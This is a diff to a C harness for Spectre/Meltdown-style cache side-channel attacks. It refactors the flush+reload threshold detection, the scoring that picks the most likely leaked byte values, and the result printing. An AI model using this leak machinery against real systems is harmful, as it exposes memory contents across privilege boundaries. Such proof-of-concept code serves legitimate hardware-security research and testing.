@@ -52,7 +52,7 @@ static void print_dump(const unsigned char *p, size_t size) {
     }
 }
 
-static size_t detect_flush_reload_threshold() {
+static size_t detect_flush_reload_threshold(void) {
     size_t reload_time = 0, flush_reload_time = 0, threshold, count = 1000000;
     uint64_t start = 0, end = 0;
     uint8_t dummy[4096];
@@ -113,47 +113,51 @@ static void read_byte(size_t address, result_t *result, int tries, size_t thresh
             _mm_clflush((void *)addr); // Flush from cache and try next address
         }
         
-        // Locate 3 highest results
+        // Locate 3 highest bytes
         v1 = v2 = v3 = -1;
         for (int i = 0; i < 256; i++) {
-            if (s[i] <= 0) {
+            if (s[i] == 0) {
                 continue;
             }
-            if (v1 < 0 || s[i] >= s[v1]) {
+            if (v1 < 0 || s[i] > s[v1]) {
                 v3 = v2;
                 v2 = v1;
                 v1 = i;
-            } else if (v2 < 0 || s[i] >= s[v2]) {
+            } else if (v2 < 0 || s[i] > s[v2]) {
                 v3 = v2;
                 v2 = i;
-            } else if (v3 < 0 || s[i] >= s[v3]) {
+            } else if (v3 < 0 || s[i] > s[v3]) {
                 v3 = i;
             }
         }
         
         if (v1 > 0) {
-            // Non-zero byte found
-            if (v2 < 0) {
-                if (s[v1] > 2) {
-                    result->tries++;
-                    break;
-                }
-            } else {
+            // First byte has non-zero value
+            if (v2 != -1) {
+                // Second best byte defined
                 if (s[v1] > 2 * s[v2] + 2) {
                     result->tries++;
                     break;
                 }
+            } else {
+                // Only first byte defined
+                if (s[v1] > 2) {
+                    result->tries++;
+                    break;
+                }
             }
-        } else if (v1 == 0 && v2 > 0) {
-            // Zero byte found and 2nd best value defined
+        } else if (v1 == 0 && v2 != -1) {
+            // First byte has zero value & second best byte defined
             // Possible misprediction for spectre_v1 and meltdown_fast
-            if (v3 < 0) {
-                if (s[v2] > 2) {
+            if (v3 != -1) {
+                // Third best byte defined
+                if (s[v2] > 2 * s[v3] + 2) {
                     result->tries++;
                     break;
                 }
             } else {
-                if (s[v2] > 2 * s[v3] + 2) {
+                // Third best byte undefined
+                if (s[v2] > 2) {
                     result->tries++;
                     break;
                 }
@@ -162,24 +166,30 @@ static void read_byte(size_t address, result_t *result, int tries, size_t thresh
     }
     
     if (v1 > 0) {
+        // First byte has non-zero value
         result->v1 = (uint8_t)v1;
         result->s1 = s[v1];
-        if (v2 >= 0) {
+        if (v2 != -1) {
+            // Second best value defined
             result->v2 = (uint8_t)v2;
             result->s2 = s[v2];
         }
     } else if (v1 == 0) {
-        // Zero byte found. Possible misprediction for spectre_v1 and meltdown_fast
+        // First byte has zero value
+        // Possible misprediction for spectre_v1 and meltdown_fast
         result->zero = s[v1];
-        if (v2 > 0) {
+        if (v2 != -1) {
+            // Second best byte defined
             result->v1 = (uint8_t)v2;
             result->s1 = s[v2];
-            if (v3 > 0) {
+            if (v3 != -1) {
+                // Third best byte defined
                 result->v2 = (uint8_t)v3;
                 result->s2 = s[v3];
             }
         } else {
-            // No misprediction. Zero is the correct value
+            // Zero is the correct value for first byte
+            // No misprediction
             result->v1 = (uint8_t)v1;
             result->s1 = s[v1];
         }
@@ -199,7 +209,7 @@ int execute(void *addres, size_t len, int tries, exploit_handler exploit) {
     size_t threshold = detect_flush_reload_threshold();
     size_t x = (size_t)addres;
     
-    // Flush table[256 * (0..255)] from cache
+    // Flush table[CACHE_PAGE * (0..255)] from cache
     for (int i = 0; i < 256; i++) {
         _mm_clflush(buffer.table + i * CACHE_PAGE);
     }
@@ -214,7 +224,7 @@ int execute(void *addres, size_t len, int tries, exploit_handler exploit) {
         read_byte(x++, &result, tries, threshold, exploit);
         
         if (result.s1 > 0) {
-            printf("%9s ", result.zero > 0 ? "Zero" : (result.s1 >= 2 * result.s2 ? "Success" : "Unclear"));
+            printf("%9s ", result.zero > 0 ? "Zero" : (result.s1 >= 2 * result.s2 + 2 ? "Success" : "Unclear"));
             printf("0x%02X %c %5d ", result.v1, (result.v1 >= 0x20 && result.v1 <= 0x7E) ? result.v1 : ' ', result.s1);
             if (result.s2 > 0) {
                 printf("0x%02X %c %5d ", result.v2, (result.v2 >= 0x20 && result.v2 <= 0x7E) ? result.v2 : ' ', result.s2);
